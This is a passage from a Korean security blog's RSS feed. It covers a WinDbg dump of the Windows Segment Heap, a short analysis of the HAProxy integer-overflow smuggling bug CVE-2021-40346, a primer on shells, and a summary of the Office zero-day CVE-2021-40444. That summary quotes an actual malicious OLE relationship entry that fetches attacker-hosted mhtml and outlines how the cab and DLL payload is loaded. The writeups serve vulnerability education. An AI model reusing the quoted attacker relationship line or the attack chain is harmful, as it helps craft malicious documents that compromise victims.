c"><span class="hljs-number">0</span>:<span class="hljs-number">022</span>&gt; dt ntdll!_SEGMENT_HEAP <span class="hljs-number">23486</span>a90000   +<span class="hljs-number">0x000</span> EnvHandle        : RTL_HP_ENV_HANDLE   +<span class="hljs-number">0x010</span> Signature        : <span class="hljs-number">0xddeeddee</span>   +<span class="hljs-number">0x014</span> GlobalFlags      : <span class="hljs-number">0</span>   +<span class="hljs-number">0x018</span> Interceptor      : <span class="hljs-number">0</span>   +<span class="hljs-number">0x01c</span> ProcessHeapListIndex : <span class="hljs-number">1</span>   +<span class="hljs-number">0x01e</span> AllocatedFromMetadata : <span class="hljs-number">0</span>y0   +<span class="hljs-number">0x020</span> CommitLimitData  : _RTL_HEAP_MEMORY_LIMIT_DATA   +<span class="hljs-number">0x020</span> ReservedMustBeZero1 : <span class="hljs-number">0</span>   +<span class="hljs-number">0x028</span> UserContext      : (null)    +<span class="hljs-number">0x030</span> ReservedMustBeZero2 : <span class="hljs-number">0</span>   +<span class="hljs-number">0x038</span> Spare            : (null)    +<span class="hljs-number">0x040</span> LargeMetadataLock : <span class="hljs-number">0</span>   +<span class="hljs-number">0x048</span> LargeAllocMetadata : _RTL_RB_TREE   +<span class="hljs-number">0x058</span> LargeReservedPages : <span class="hljs-number">0</span>   +<span class="hljs-number">0x060</span> LargeCommittedPages : <span class="hljs-number">0</span>   +<span class="hljs-number">0x068</span> StackTraceInitVar : _RTL_RUN_ONCE   +<span class="hljs-number">0x080</span> MemStats         : _HEAP_RUNTIME_MEMORY_STATS   +<span class="hljs-number">0x0d8</span> GlobalLockCount  : <span class="hljs-number">0</span>   +<span class="hljs-number">0x0dc</span> GlobalLockOwner  : <span class="hljs-number">0</span>   +<span class="hljs-number">0x0e0</span> ContextExtendLock : <span class="hljs-number">0</span>   +<span class="hljs-number">0x0e8</span> AllocatedBase    : <span class="hljs-number">0x00000234</span>`<span class="hljs-number">86</span>a95300  <span class="hljs-string">&quot;&quot;</span>   +<span class="hljs-number">0x0f0</span> UncommittedBase  : <span class="hljs-number">0x00000234</span>`<span class="hljs-number">86</span>a96000  <span class="hljs-string">&quot;--- memory read error at address 0x00000234`86a96000 ---&quot;</span>   +<span class="hljs-number">0x0f8</span> ReservedLimit    : <span class="hljs-number">0x00000234</span>`<span class="hljs-number">86</span>aa9000  <span class="hljs-string">&quot;--- memory read error at address 0x00000234`86aa9000 ---&quot;</span>   +<span class="hljs-number">0x100</span> SegContexts      : [<span class="hljs-number">2</span>] _HEAP_SEG_CONTEXT   +<span class="hljs-number">0x280</span> VsContext        : _HEAP_VS_CONTEXT   +<span class="hljs-number">0x340</span> LfhContext       : _HEAP_LFH_CONTEXT</code></pre><ul><li><code>Signature</code> : &#xB450; &#xC720;&#xD615;&#xC758; Heap&#xC744; &#xAD6C;&#xBD84;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB428;. <code>0xDDEEDDEE</code>&#xAC00; Segment Heap&#xC758; Signature</li></ul><blockquote><p>NT Heap&#xC758; signature&#xB294; <code>0xFFEEFFEE</code></p></blockquote><ul><li><code>LargeAllocMetadata</code> - Large Block &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130;&#xC758; &#xB808;&#xB4DC;&#xBE14;&#xB799;(RB) &#xD2B8;&#xB9AC;</li><li><code>LargeReservedPages</code> - &#xBAA8;&#xB4E0; Large Block &#xD560;&#xB2F9;&#xC744; &#xC704;&#xD574; &#xC608;&#xC57D;&#xB41C; &#xD398;&#xC774;&#xC9C0; &#xC218;</li><li><code>LargeCommittedPages</code> - &#xBAA8;&#xB4E0; Large Block &#xD560;&#xB2F9;&#xC5D0; &#xB300;&#xD574; &#xCEE4;&#xBC0B;&#xB41C; &#xD398;&#xC774;&#xC9C0; &#xC218;</li><li><code>VsContext</code>, <code>LfhContext</code> : &#xAC01;&#xAC01; VS&#xC640; LFH &#xD560;&#xB2F9;&#xC790; &#xC815;&#xBCF4;&#xB97C; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC74C;</li></ul><p>Segment Heap&#xC758; &#xAC1C;&#xC694;&#xB294; &#xC774; &#xC815;&#xB3C4;&#xB85C; &#xC815;&#xB9AC;&#xD558;&#xACE0; &#xB2E4;&#xC74C; &#xD30C;&#xD2B8;&#xBD80;&#xD130;&#xB294; Segment Heap&#xC774; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC5D0; &#xB300;&#xD574; &#xC880; &#xB354; &#xC790;&#xC138;&#xD788; &#xC54C;&#xC544;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBB38;&#xC81C;&#xAE4C;&#xC9C0; &#xD480;&#xB824;&#xBA74; &#xAC08; &#xAE38;&#xC774; &#xBA38;&#xB124;&#xC694;..! </p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/heap/">heap</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/research/">research</category>
      
      <category domain="https://hackyboiz.github.io/tags/segment-heap/">segment heap</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows-10/">windows 10</category>
      
      
      <comments>https://hackyboiz.github.io/2021/09/19/l0ch/segment-heap-part1/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-40346: HAProxy에서 발견된 Integer Overflow를 통한 HTTP Smuggling</title>
      <link>https://hackyboiz.github.io/2021/09/18/l0ch/2021-09-18/</link>
      <guid>https://hackyboiz.github.io/2021/09/18/l0ch/2021-09-18/</guid>
      <pubDate>Sat, 18 Sep 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://jfrog.com/blog/critical-vulnerability-in-haproxy-</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/">Critical Vulnerability in HAProxy (CVE-2021-40346): Integer Overflow Enables HTTP Smuggling</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>HAProxy 2.0.25, 2.2.17, 2.3.14, 2.4.4 &#xC774;&#xC804;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>HAProxy&#xB294; &#xAE30;&#xC874; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4; &#xC2A4;&#xC704;&#xCE58;&#xC5D0;&#xC11C; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xC744; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xB85C; &#xAD6C;&#xD604;&#xD55C; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xB85C;&#xB4DC; &#xBC38;&#xB7F0;&#xC11C;&#xC785;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xC5D0;&#xC11C; HTTP Request Smuggling &#xACF5;&#xACA9;&#xC744; &#xAC00;&#xB2A5;&#xD558;&#xAC8C; &#xD558;&#xB294; unsigned integer overflow &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; HTX block&#xC744; &#xCD94;&#xAC00;&#xD558;&#xB294; <code>htx_add_header</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">inline</span> struct htx_blk *<span class="hljs-title">htx_add_header</span><span class="hljs-params">(struct htx *htx, <span class="hljs-keyword">const</span> struct ist name,</span></span><span class="hljs-function"><span class="hljs-params">     <span class="hljs-keyword">const</span> struct ist value)</span></span><span class="hljs-function"></span>{<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">htx_blk</span> *<span class="hljs-title">blk</span>;</span><span class="hljs-comment">/* <span class="hljs-doctag">FIXME:</span> check name.len (&lt; 256B) and value.len (&lt; 1MB) */</span>blk = htx_add_blk(htx, HTX_BLK_HDR, name.len + value.len);<span class="hljs-keyword">if</span> (!blk)<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;blk-&gt;info += (value.len &lt;&lt; <span class="hljs-number">8</span>) + name.len;  <span class="hljs-comment">//vuln!</span>ist2bin_lc(htx_get_blk_ptr(htx, blk), name);<span class="hljs-built_in">memcpy</span>(htx_get_blk_ptr(htx, blk)  + name.len, value.ptr, value.len);<span class="hljs-keyword">return</span> blk;}</code></pre><p><code>htx_add_header</code> &#xD568;&#xC218;&#xB294; &#xD5E4;&#xB354; &#xC774;&#xB984; <code>name</code>&#xACFC; &#xD5E4;&#xB354; &#xAC12; <code>value</code>&#xB97C; &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xB85C; &#xBC1B;&#xC544; &#xB2E4;&#xC74C; &#xC791;&#xC5C5;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. </p><ol><li>&#xD5E4;&#xB354; &#xD0C0;&#xC785;(<code>b0010</code>)&#xC758; &#xC0C8; HTX block&#xC744; &#xCD94;&#xAC00;&#xD569;&#xB2C8;&#xB2E4;. </li><li>&#xC0DD;&#xC131;&#xB41C; block&#xC758; <code>info</code> &#xD544;&#xB4DC;&#xC5D0; <code>name</code>&#xC758; &#xAE38;&#xC774;&#xC640; <code>value</code>&#xC758; &#xAE38;&#xC774;&#xB97C; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.<ol><li>&#xC774;&#xB54C; <code>value</code>&#xC758; &#xAE38;&#xC774;&#xB97C; 8 bit &#xB9CC;&#xD07C; left shift&#xD574; <code>name</code> &#xAE38;&#xC774;&#xC640; &#xB354;&#xD574; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</li></ol></li><li><code>name</code>&#xC774; <code>lowercase</code>&#xB85C; HTX block&#xC73C;&#xB85C; &#xBCF5;&#xC0AC;&#xB418;&#xACE0;, &#xBC14;&#xB85C; &#xB4A4;&#xC5D0; <code>value</code>&#xAC00; &#xBCF5;&#xC0AC;&#xB429;&#xB2C8;&#xB2E4;.</li></ol><p>&#xC608;&#xB97C; &#xB4E4;&#xC5B4; &#xD5E4;&#xB354; &#xC774;&#xB984;&#xACFC; &#xAC12;&#xC774; <code>MyName:MyValue</code>&#xC778; &#xACBD;&#xC6B0; <code>info</code> &#xD544;&#xB4DC;&#xC5D0;&#xB294; &#xB2E4;&#xC74C; &#xAC12;&#xC774; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-comment">// Type : b0010</span><span class="hljs-comment">// MyName length : 0x6</span><span class="hljs-comment">// MyValue Length : 0x7 </span>block-&gt;info = (<span class="hljs-number">0x2</span> &lt;&lt; <span class="hljs-number">28</span>) + (<span class="hljs-number">0x7</span> &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-number">0x06</span> = <span class="hljs-number">0x20000706</span></code></pre><p>&#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xD5E4;&#xB354; &#xC774;&#xB984; <code>name</code>&#xC758; &#xAE38;&#xC774;&#xB97C; &#xAC80;&#xC99D;&#xD558;&#xC9C0; &#xC54A;&#xC544; 255 bytes&#xBCF4;&#xB2E4; &#xAE34; &#xC774;&#xB984;&#xC758; &#xD5E4;&#xB354;&#xB97C; &#xC804;&#xB2EC;&#xD574; &#xC774;&#xD6C4; &#xD30C;&#xC2F1; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xB2E4;&#xB978; &#xD5E4;&#xB354; &#xC774;&#xB984;&#xC73C;&#xB85C; &#xBCF4;&#xC774;&#xAC8C; &#xD560; &#xC218; &#xC788;&#xC5B4; HTTP Reuest Smuggling &#xACF5;&#xACA9;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/integer-overflow/">integer overflow</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/http-smuggling/">http smuggling</category>
      
      <category domain="https://hackyboiz.github.io/tags/cve-2021-40346/">cve-2021-40346</category>
      
      
      <comments>https://hackyboiz.github.io/2021/09/18/l0ch/2021-09-18/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[해키피디아] Shell</title>
      <link>https://hackyboiz.github.io/2021/09/17/poosic/Shell/</link>
      <guid>https://hackyboiz.github.io/2021/09/17/poosic/Shell/</guid>
      <pubDate>Fri, 17 Sep 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;img src=&quot;/2021/09/17/poosic/Shell/image1.png&quot; alt=&quot;Untitled.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#xC258;(Shell)&lt;/strong&gt;&amp;#xC740; &amp;#xC6B4;&amp;#xC601;&amp;#xCCB</description>
        
      
      
      
      <content:encoded><![CDATA[<p><img src="/2021/09/17/poosic/Shell/image1.png" alt="Untitled.jpg"></p><p><strong>&#xC258;(Shell)</strong>&#xC740; &#xC6B4;&#xC601;&#xCCB4;&#xC81C;&#xC0C1;&#xC5D0;&#xC11C; &#xCEE4;&#xB110;&#xACFC; &#xC0C1;&#xD638;&#xC791;&#xC6A9;&#xD558;&#xC5EC; &#xB2E4;&#xC591;&#xD55C; &#xAE30;&#xB2A5;&#xACFC; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xAD6C;&#xD604;&#xD558;&#xACE0; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xB97C; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC785;&#xB2C8;&#xB2E4;. &#xC989;, &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC785;&#xB825;&#xD55C; &#xAC12;(&#xBA85;&#xB839;&#xC5B4;, &#xD074;&#xB9AD; &#xB4F1; &#x2026;)&#xC744; &#xD574;&#xC11D;&#xD558;&#xC5EC; &#xCEE4;&#xB110;&#xC5D0; &#xC804;&#xB2EC;&#xD558;&#xB294; &#xC5ED;&#xD560;&#xC744; &#xD558;&#xB294; <strong>&#xBA85;&#xB839;&#xC5B4; &#xD574;&#xC11D;&#xAE30;(Command Interpreter)</strong>&#xB77C;&#xACE0; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="&#xC65C;-&#xC774;&#xB984;&#xC774;-&#xC258;-Shell-&#xC77C;&#xAE4C;&#xC694;"><a href="#&#xC65C;-&#xC774;&#xB984;&#xC774;-&#xC258;-Shell-&#xC77C;&#xAE4C;&#xC694;" class="headerlink" title="&#xC65C; &#xC774;&#xB984;&#xC774; &#xC258;(Shell)&#xC77C;&#xAE4C;&#xC694;?"></a>&#xC65C; &#xC774;&#xB984;&#xC774; &#xC258;(Shell)&#xC77C;&#xAE4C;&#xC694;?</h3><p>&#xC704;&#xC5D0;&#xC11C; &#xC124;&#xBA85;&#xD558;&#xC600;&#xB4EF;&#xC774; &#xC258;&#xC740; &#xC0AC;&#xC6A9;&#xC790;&#xC640; &#xCEE4;&#xB110;&#xAC04;&#xC758; &#xC18C;&#xD1B5;&#xCC3D;&#xAD6C; &#xC5ED;&#xD560;&#xC744; &#xD569;&#xB2C8;&#xB2E4;. &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xCEE4;&#xB110;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xBC18;&#xB4DC;&#xC2DC; &#xC258;&#xC744; &#xAC70;&#xCCD0;&#xC57C; &#xD574; &#xC258;&#xC774; &#xCEE4;&#xB110;&#xC744; &#xAC10;&#xC2F8;&#xACE0; &#xC788;&#xB294; &#xD615;&#xD0DC;&#xAC00; &#xC870;&#xAC1C; &#xAECD;&#xB370;&#xAE30;&#xC640; &#xBE44;&#xC2B7;&#xD558;&#xB2E4;&#xACE0; &#xD558;&#xC5EC; &#xC870;&#xAC1C;&#xAECD;&#xB370;&#xAE30;&#xB97C; &#xB73B;&#xD558;&#xB294; &#xC258;&#xC774;&#xB77C;&#xB294; &#xC774;&#xB984;&#xC774; &#xBD80;&#xC5EC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="&#xC258;&#xC758;-&#xC885;&#xB958;"><a href="#&#xC258;&#xC758;-&#xC885;&#xB958;" class="headerlink" title="&#xC258;&#xC758; &#xC885;&#xB958;"></a>&#xC258;&#xC758; &#xC885;&#xB958;</h3><p>&#xC258;&#xC740; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xC791;&#xB3D9;&#xD558;&#xB294; <strong>CLI(Command Line Interface) &#xAE30;&#xBC18; &#xC258;</strong>, &#xADF8;&#xB798;&#xD53D; &#xC694;&#xC18C;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xC791;&#xB3D9;&#xD558;&#xB294; <strong>GUI(Graphical User Interface) &#xAE30;&#xBC18; &#xC258;</strong>&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/17/poosic/Shell/image2.jpg" alt="Untitled.jpg"></p><p><strong>CLI &#xAE30;&#xBC18; &#xC258;</strong>&#xC740; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xD130;&#xBBF8;&#xB110;&#xC5D0; &#xC785;&#xB825;&#xD574; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xC774;&#xB3D9;, &#xD30C;&#xC77C; &#xBCF5;&#xC0AC; &#xB4F1; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC6D0;&#xD558;&#xB294; &#xC791;&#xC5C5;&#xC744; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C;, GUI &#xAE30;&#xBC18; &#xC258;&#xACFC; &#xB2E4;&#xB974;&#xAC8C; &#xADF8;&#xB798;&#xD53D;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xC544; &#xC694;&#xCCAD;&#xC5D0; &#xB300;&#xD55C; &#xC218;&#xD589; &#xC18D;&#xB3C4;&#xAC00; &#xBE60;&#xB985;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC5EC;&#xB7EC; &#xB3D9;&#xC791;&#xC744; &#xC704;&#xD574;&#xC11C;&#xB294; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xAE30;&#xC5B5;&#xD574;&#xC57C; &#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xBBF8;&#xC219;&#xD55C; &#xC0AC;&#xC6A9;&#xC790;&#xC5D0;&#xAC8C;&#xB294; &#xBD88;&#xD3B8;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. CLI &#xAE30;&#xBC18; &#xC258;&#xC758; &#xB300;&#xD45C;&#xC801;&#xC778; &#xC608;&#xC2DC;&#xB85C;&#xB294; Windows&#xC758; CMD, Mac&#xC758; &#xD130;&#xBBF8;&#xB110;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/17/poosic/Shell/image3.png" alt="Untitled.jpg"></p><p><strong>GUI &#xAE30;&#xBC18; &#xC258;</strong>&#xC740; &#xCC3D;, &#xC544;&#xC774;&#xCF58; &#xB4F1;&#xC758; &#xADF8;&#xB798;&#xD53D; &#xC694;&#xC18C;&#xC640; &#xC0C1;&#xD638;&#xC791;&#xC6A9;&#xC744; &#xD1B5;&#xD574; &#xC6D0;&#xD558;&#xB294; &#xC791;&#xC5C5;&#xC744; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xADF8;&#xB798;&#xD53D;&#xC801;&#xC778; &#xC694;&#xC18C;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; CLI &#xAE30;&#xBC18; &#xC258;&#xBCF4;&#xB2E4; &#xD6E8;&#xC52C; &#xB354; &#xB9CE;&#xC740; &#xB9AC;&#xC18C;&#xC2A4;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC218;&#xD589; &#xC18D;&#xB3C4;&#xAC00; &#xB290;&#xB9BD;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xADF8;&#xB798;&#xD53D; &#xC694;&#xC18C;&#xC640; &#xAC04;&#xB2E8;&#xD55C; &#xC0C1;&#xD638;&#xC791;&#xC6A9;&#xB9CC;&#xC73C;&#xB85C;&#xB3C4; &#xC5EC;&#xB7EC; &#xC791;&#xC5C5;&#xC5D0; &#xB300;&#xD55C; &#xCC98;&#xB9AC;&#xAC00; &#xAC00;&#xB2A5;&#xD574; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xAE30;&#xC5B5;&#xD560; &#xD544;&#xC694;&#xAC00; &#xC5C6;&#xC5B4; &#xBBF8;&#xC219;&#xD55C; &#xC0AC;&#xC6A9;&#xC790;&#xB77C;&#xB3C4; &#xD070; &#xBD88;&#xD3B8;&#xD568; &#xC5C6;&#xC774; &#xB300;&#xBD80;&#xBD84;&#xC758; &#xC791;&#xC5C5;&#xC744; &#xCC98;&#xB9AC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. Windows&#xC758; &#xD30C;&#xC77C; &#xD0D0;&#xC0C9;&#xAE30;&#xAC00; &#xB300;&#xD45C;&#xC801;&#xC778; GUI &#xAE30;&#xBC18; &#xC258;&#xC758; &#xC608;&#xC2DC;&#xB85C; &#xB4E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Hackypedia/">Hackypedia</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/poosic/">poosic</category>
      
      <category domain="https://hackyboiz.github.io/tags/Shell/">Shell</category>
      
      <category domain="https://hackyboiz.github.io/tags/%EC%89%98/">쉘</category>
      
      <category domain="https://hackyboiz.github.io/tags/%EC%85%B8/">셸</category>
      
      
      <comments>https://hackyboiz.github.io/2021/09/17/poosic/Shell/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] Remote Code Execution 0-Day (CVE-2021-40444) Hits Windows, Triggered Via Office Docs</title>
      <link>https://hackyboiz.github.io/2021/09/16/j0ker/2021-09-16/</link>
      <guid>https://hackyboiz.github.io/2021/09/16/j0ker/2021-09-16/</guid>
      <pubDate>Thu, 16 Sep 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.trendmicro.com/en_us/research/21/i/remote-cod</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.trendmicro.com/en_us/research/21/i/remote-code-execution-zero-day--cve-2021-40444--hits-windows--tr.html">https://www.trendmicro.com/en_us/research/21/i/remote-code-execution-zero-day--cve-2021-40444--hits-windows--tr.html</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Microsoft Office Word</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xCD5C;&#xADFC; &#xD2B8;&#xC704;&#xD130;&#xAC00; &#xC774;&#xAC70; &#xB54C;&#xBB38;&#xC5D0; &#xD56B;&#xD558;&#xC8E0;. &#xC5ED;&#xC2DC; &#xC2E4;&#xC81C; &#xACF5;&#xACA9;&#xC5D0; &#xC0AC;&#xC6A9;&#xB41C; &#xCDE8;&#xC57D;&#xC810; &#xC785;&#xB2C8;&#xB2E4;!</p><p>&#xC77C;&#xB2E8; &#xC6CC;&#xB4DC; &#xD30C;&#xC77C; &#xC548;&#xC5D0; &#xC788;&#xB294; relationship &#xD30C;&#xC77C;&#xC744; &#xBCF4;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xC218;&#xC0C1;&#xD55C; URL&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs powershell">&lt;Relationship Id=<span class="hljs-string">&quot;rId6&quot;</span> <span class="hljs-built_in">Type</span>=<span class="hljs-string">&quot;&lt;http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject&gt;&quot;</span> Target=<span class="hljs-string">&quot;mhtml:&lt;http://hidusi.com/e8c76295a5f9acb7/side.html!x-usc:http://hidusi.com/e8c76295a5f9acb7/side.html&gt;&quot;</span> TargetMode=<span class="hljs-string">&quot;External&quot;</span> /&gt;</code></pre><p>Relationship &#xD30C;&#xC77C;&#xC5D0;&#xB294; &#xBCF4;&#xD1B5; &#xB0B4;/&#xC678;&#xBD80;&#xB85C;&#xBD80;&#xD130; &#xAC00;&#xC838;&#xC624;&#xB294; &#xB9AC;&#xC18C;&#xC2A4;&#xB4E4;&#xC744; &#xB2F4;&#xACE0; &#xC788;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xCEE4;&#xB294; &#xC704; &#xB9C1;&#xD2B8;&#xC5D0;&#xC11C; mhtml &#xD30C;&#xC77C;&#xC744; &#xAC00;&#xC838;&#xC624;&#xB294;&#xB370;, mhtml &#xD30C;&#xC77C;&#xC740; &#xC774;&#xBBF8;&#xC9C0;, &#xD50C;&#xB798;&#xC2DC; &#xC560;&#xB2C8;&#xBA54;&#xC774;&#xC158; &#xB4F1; &#xBAA8;&#xB4E0; &#xB9AC;&#xC18C;&#xC2A4;&#xAC00; &#xD55C;&#xAEBC;&#xBC88;&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xB294; html &#xD30C;&#xC77C;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB807;&#xAC8C;&#xB418;&#xBA74; &#xC6D0;&#xACA9; &#xC11C;&#xBC84;&#xC5D0; &#xC788;&#xB294; mhtml &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC744; &#xD1B5;&#xD574; side.html &#xD30C;&#xC77C;&#xC774; IE&#xC5D0; &#xB85C;&#xB4DC;&#xB418;&#xC5B4; &#xC548;&#xC5D0; &#xC788;&#xB294; &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xAC00; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;. &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; cab &#xD30C;&#xC77C;&#xC744; &#xB2E4;&#xC6B4; &#xBC1B;&#xACE0; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. cab &#xD30C;&#xC77C;&#xC5D0;&#xC11C;&#xB294; dll &#xD30C;&#xC77C;&#xC744; championship.inf&#xB77C;&#xB294; &#xC774;&#xB984;&#xC73C;&#xB85C; &#xC800;&#xC7A5;&#xD558;&#xACE0; path traversal&#xC744; &#xD1B5;&#xD574; &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC744; &#xB85C;&#xB4DC;&#xD558;&#xC5EC; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/cve-2021-40444/">cve-2021-40444</category>
      
      <category domain="https://hackyboiz.github.io/tags/office/">office</category>
      
      <category domain="https://hackyboiz.github.io/tags/word/">word</category>
      
      <category domain="https://hackyboiz.github.io/tags/ole/">ole</category>
      
      <category domain="https://hackyboiz.github.io/tags/html/">html</category>
      
      <category domain="https://hackyboiz.github.io/tags/path-traversal/">path traversal</category>
      
      
      <comments>https://hackyboiz.github.io/2021/09/16/j0ker/2021-09-16/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[해키피디아] Turing Machine, Halt Problem</title>
      <link>https://hackyboiz.github.io/2021/09/15/y00n_nms/turing-machine/</link>
